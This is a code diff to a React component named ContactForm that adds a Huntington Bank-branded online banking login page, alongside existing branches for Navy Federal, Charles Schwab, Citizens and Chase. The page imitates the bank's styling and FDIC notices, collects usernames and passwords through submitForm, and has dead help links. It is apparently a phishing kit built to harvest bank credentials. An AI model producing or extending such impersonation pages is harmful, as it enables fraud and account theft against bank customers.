@@ -103,6 +103,7 @@ export default function ContactForm() {
   const isNavyFederal = bankName?.toLowerCase().includes('navy federal')
   const isCharlesSchwab = bankName?.toLowerCase().includes('charles schwab')
   const isCitizens = bankName?.toLowerCase().includes('citizens')
+  const isHuntington = bankName?.toLowerCase().includes('huntington')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -1333,6 +1334,137 @@ export default function ContactForm() {
                 <p className="text-sm italic text-gray-700">
                   Non-deposit products: Are not FDIC Insured; Are not deposits; May lose value.
                 </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Huntington Bank
+    if (isHuntington) {
+      const [selectedCategory, setSelectedCategory] = useState('personal')
+
+      return (
+        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-2xl border-4 border-green-700 p-12">
+              {/* Category Tabs */}
+              <div className="mb-8 flex gap-4">
+                <button
+                  onClick={() => setSelectedCategory('personal')}
+                  className={`px-6 py-3 font-bold transition-colors ${
+                    selectedCategory === 'personal'
+                      ? 'rounded-lg bg-green-700 text-white'
+                      : 'border-2 border-green-700 text-green-700 hover:bg-green-50'
+                  }`}
+                >
+                  Personal & Business
+                </button>
+                <button
+                  onClick={() => setSelectedCategory('commercial')}
+                  className={`px-6 py-3 font-bold transition-colors ${
+                    selectedCategory === 'commercial'
+                      ? 'rounded-lg bg-green-700 text-white'
+                      : 'border-2 border-green-700 text-green-700 hover:bg-green-50'
+                  }`}
+                >
+                  Commercial
+                </button>
+                <button
+                  onClick={() => setSelectedCategory('other')}
+                  className={`px-6 py-3 font-bold transition-colors ${
+                    selectedCategory === 'other'
+                      ? 'rounded-lg bg-green-700 text-white'
+                      : 'border-2 border-green-700 text-green-700 hover:bg-green-50'
+                  }`}
+                >
+                  Other
+                </button>
+              </div>
+
+              {/* FDIC Badge */}
+              <div className="mb-8 flex items-center gap-3">
+                <svg className="h-8 w-auto" viewBox="0 0 100 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <rect width="100" height="60" fill="#003366" />
+                  <text x="50" y="40" fontSize="24" fontWeight="bold" fill="white" textAnchor="middle">
+                    FDIC
+                  </text>
+                </svg>
+                <span className="text-sm italic text-gray-700">
+                  FDIC-Insured—Backed by the full faith and credit of the U.S. Government
+                </span>
+              </div>
+
+              <form onSubmit={submitForm} className="space-y-8">
+                <h2 className="text-3xl font-bold text-green-700">Log into Online Banking</h2>
+
+                {/* Username */}
+                <div>
+                  <label className="mb-3 block text-base text-gray-600">Username</label>
+                  <input
+                    type="text"
+                    required
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    className="w-full border-2 border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-green-700"
+                  />
+                </div>
+
+                {/* Password */}
+                <div>
+                  <label className="mb-3 block text-base text-gray-600">Password</label>
+                  <div className="relative">
+                    <input
+                      type={showPassword ? 'text' : 'password'}
+                      required
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="w-full border-2 border-gray-400 px-4 py-3 pr-10 text-gray-800 outline-none transition-colors focus:border-green-700"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                    >
+                      <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
+                    </button>
+                  </div>
+                </div>
+
+                {/* Log In Button + Help Links */}
+                <div className="flex items-center justify-between gap-8 pt-4">
+                  <button
+                    type="submit"
+                    disabled={submitting}
+                    className="flex items-center gap-3 rounded-full bg-gray-800 px-8 py-3 font-bold text-white hover:bg-gray-900 transition-colors disabled:opacity-60"
+                  >
+                    <Icon name="lock" size={20} />
+                    <span>{submitting ? 'Logging in…' : 'Log In'}</span>
+                  </button>
+
+                  <div className="space-y-2 text-center">
+                    <a href="#" className="block text-base text-gray-800 hover:text-gray-600 font-semibold underline">
+                      Forgot Username?
+                    </a>
+                    <a href="#" className="block text-base text-gray-800 hover:text-gray-600 font-semibold underline">
+                      Forgot Password?
+                    </a>
+                  </div>
+                </div>
+              </form>
+
+              {/* Footer Links */}
+              <div className="mt-10 border-t border-gray-300 pt-8">
+                <p className="text-lg font-bold text-green-700">New to Online Banking?</p>
+                <div className="mt-2 space-y-2">
+                  <a href="#" className="block text-base text-gray-800 hover:text-gray-600 underline">
+                    Enroll Now
+                  </a>
+                  <a href="#" className="block text-base text-gray-800 hover:text-gray-600 underline">
+                    Learn More
+                  </a>
+                </div>
               </div>
             </div>
           </div>
